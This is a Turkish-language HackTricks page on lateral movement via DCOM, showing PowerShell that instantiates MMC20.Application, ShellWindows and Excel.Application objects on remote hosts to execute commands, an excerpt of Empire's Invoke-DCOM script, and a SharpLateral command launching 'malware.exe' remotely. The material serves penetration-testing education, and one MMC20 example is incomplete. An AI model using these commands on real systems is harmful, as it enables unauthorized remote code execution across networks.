# DCOM Exec

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

* **Bir **cybersecurity şirketinde mi çalışıyorsunuz? **Şirketinizi HackTricks'te** görmek ister misiniz? ya da **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı göndererek PR'ler göndererek paylaşın** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Güvenlik Grubu**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Bu teknik hakkında daha fazla bilgi için orijinal yazıya [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) bakın**


Dağıtılmış Bileşen Nesne Modeli (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, DCOM ve Bileşen Nesne Modeli (COM) için kapsamlı belgeler sağlar, [buradan DCOM için](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [buradan COM için](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) erişilebilir. Bir PowerShell komutu kullanarak DCOM uygulamalarının bir listesi alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM nesnesi, [MMC Uygulama Sınıfı (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC eklentisi işlemlerinin betikleme işlemlerini sağlar. Bu nesne, özellikle `Document.ActiveView` altında `ExecuteShellCommand` yöntemini içerir. Bu yöntem hakkında daha fazla bilgi [burada](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) bulunabilir. Çalıştırarak kontrol edin:

Bu özellik, bir DCOM uygulaması aracılığıyla ağ üzerinden komutların yürütülmesini kolaylaştırır. Uzaktan yönetici olarak DCOM ile etkileşime geçmek için PowerShell aşağıdaki gibi kullanılabilir:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut DCOM uygulamasına bağlanır ve bir COM nesnesinin bir örneğini döndürür. Ardından ExecuteShellCommand yöntemi çağrılabilir ve uzak makinede bir işlemi yürütmek için kullanılabilir. İşlem aşağıdaki adımları içerir:

Yöntemleri kontrol et:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE Al:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows ve ShellBrowserWindow

**Bu teknik hakkında daha fazla bilgi için orijinal yazıya [buradan](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) ulaşabilirsiniz.**

**MMC20.Application** nesnesinin açık "LaunchPermissions" eksikliği tespit edildi ve varsayılan olarak Yöneticilere erişim izni veren izinlere sahip olduğu belirlendi. Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) konuya bakılabilir ve [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET'in kullanımı önerilir.

Özel olarak, `ShellBrowserWindow` ve `ShellWindows` nesneleri, açık Launch Permissions'a sahip olmamaları nedeniyle vurgulandı. `HKCR:\AppID\{guid}` altında bir `LaunchPermission` kaydının olmaması, açık izinlerin olmadığını gösterir.

### ShellWindows
ProgID eksik olan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak nesne örnekleştirmeyi kolaylaştırır. Bu işlem, `ShellWindows` için CLSID'yi almak için OleView .NET'in kullanılmasını gerektirir. Bir kez örneklendiğinde, etkileşim `WindowsShell.Item` yöntemi aracılığıyla mümkün olur ve `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.

Örnek PowerShell komutları, nesnenin örneklendirilmesi ve uzaktan komutların yürütülmesi için sağlanmıştır:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Excel DCOM Nesneleri ile Yana Hareket

Yana hareket, DCOM Excel nesnelerini istismar ederek gerçekleştirilebilir. Detaylı bilgi için, Excel DDE'nin DCOM aracılığıyla yana hareket için kullanılmasına ilişkin tartışmayı [Cybereason'un blogunda](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.

Empire projesi, Excel'in uzak kod yürütme (RCE) için DCOM nesnelerini manipüle ederek kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, Excel'in RCE için istismar edilmesi için farklı yöntemleri sergileyen [Empire'in GitHub deposunda](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) bulunan betikten alıntılar bulunmaktadır:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Yana Hareket için Otomasyon Araçları

Bu teknikleri otomatikleştirmek için iki araç öne çıkarılmıştır:

- **Invoke-DCOM.ps1**: Uzak makinelerde kod yürütmek için farklı yöntemleri çağırmayı basitleştiren Empire projesi tarafından sağlanan bir PowerShell betiği. Bu betik, Empire GitHub deposunda erişilebilir durumdadır.

- **SharpLateral**: Uzaktan kod yürütmek için tasarlanmış bir araçtır ve aşağıdaki komutla kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Otomatik Araçlar

* [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) adlı Powershell betiği, diğer makinelerde kodu yürütmek için yorumlanmış tüm yolları kolayca çağırmayı sağlar.
* Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referanslar

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Sıfırdan Kahraman'a kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 **Discord grubuna** katılın [**Discord group**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
